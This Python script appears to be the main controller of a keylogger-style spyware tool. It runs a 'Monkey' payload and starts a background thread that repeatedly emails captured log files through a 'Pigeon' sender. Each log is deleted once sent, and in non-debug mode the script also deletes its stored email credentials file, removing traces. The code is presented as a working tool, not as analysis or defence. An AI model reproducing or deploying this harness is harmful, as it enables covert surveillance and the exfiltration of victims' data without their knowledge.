from os import path, remove
from threading import Thread, Event
from time import sleep
from config import PigeonConfig, MonkeyConfig, AppConfig
from paylaod import Monkey
from sender import Pigeon


class App:
    def __init__(self, config: AppConfig,
                 pigeon_config: PigeonConfig,
                 monkey_config: MonkeyConfig) -> None:
        
        t1 = Thread(daemon=True, target=self.__start_sender, 
                kwargs={"debug":config.debug,
                        "email_frequency":config.email_frequency, 
                        "pigeon_config":pigeon_config})
        self.stop_event = Event()
        try:
            if config.sender_mode:
                t1.start()  
            Monkey(config=monkey_config).run()
        finally:
            if config.sender_mode:
                if path.exists(pigeon_config.filepath):
                    if Pigeon(pigeon_config).send():
                        remove(pigeon_config.filepath)
                self.stop_event.set()
            exit(0)
        
    def __start_sender(self, debug: bool,
                       email_frequency: int, 
                       pigeon_config: PigeonConfig):
        if debug:
            sleep_time = 30
        else:
            sleep_time = max(10, email_frequency) * 60
        counter=1
        while not self.stop_event.is_set():
            pigeon_config.filename = f'log_{counter}.txt'
            sleep(sleep_time)
            if not path.exists(pigeon_config.filepath):
                continue
            if Pigeon(pigeon_config).send():
                remove(pigeon_config.filepath)
                counter += 1


if __name__ == '__main__':
    config = AppConfig()
    pigeon_config = PigeonConfig()

    secret_file = 'secret.txt'

    if pigeon_config.sender_email=="":
        if not path.exists(secret_file):
            if config.debug:
                with open(secret_file, 'w') as f:
                    f.write("sender@gmail.com\ndemopass")
            else:
                exit()
        pigeon_config.get_secret_from_file(secret_file)
    if not config.debug:  
        remove(secret_file)

    App(config, pigeon_config, MonkeyConfig())

    exit()